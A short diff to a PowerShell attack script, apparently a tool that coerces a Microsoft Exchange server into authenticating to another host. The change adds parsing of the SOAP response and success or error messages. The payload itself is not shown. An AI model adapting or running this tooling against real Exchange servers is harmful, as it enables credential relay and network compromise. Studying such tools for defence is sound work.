@@ -120,7 +120,8 @@ $soapRequestStr = [string]@'
     {
         $resp = $soapWebRequest.GetResponse()
         $responseStream = $resp.GetResponseStream() 
-        $soapReader = [System.IO.StreamReader]($responseStream) 
+        $soapReader = [System.IO.StreamReader]($responseStream)
+        $returnedXML = $soapReader.ReadToEnd() 
         $responseStream.Close() 
     }
     catch [Net.WebException]
@@ -130,8 +131,19 @@ $soapRequestStr = [string]@'
         exit
     }
     if($resp.StatusCode -eq "OK")
-    {     
-        write-host "HTTP 200 response received, the target Exchange server should be authenticating shortly." -ForegroundColor Green
+    {
+        if($returnedXML -match "NoError")
+        {
+            write-host "HTTP 200 response received, the target Exchange server should be authenticating shortly." -ForegroundColor Green
+        }
+        Elseif($returnedXML -match "ErrorMissingEmailAddress")
+        {
+            write-host "Error: User does not have an email address associated with their account" -ForegroundColor Red
+        }   
+        Else
+        {
+            write-host "An error has occured, attack was likely unsuccessful" -ForegroundColor Red
+        }    
     }
     Else
     {
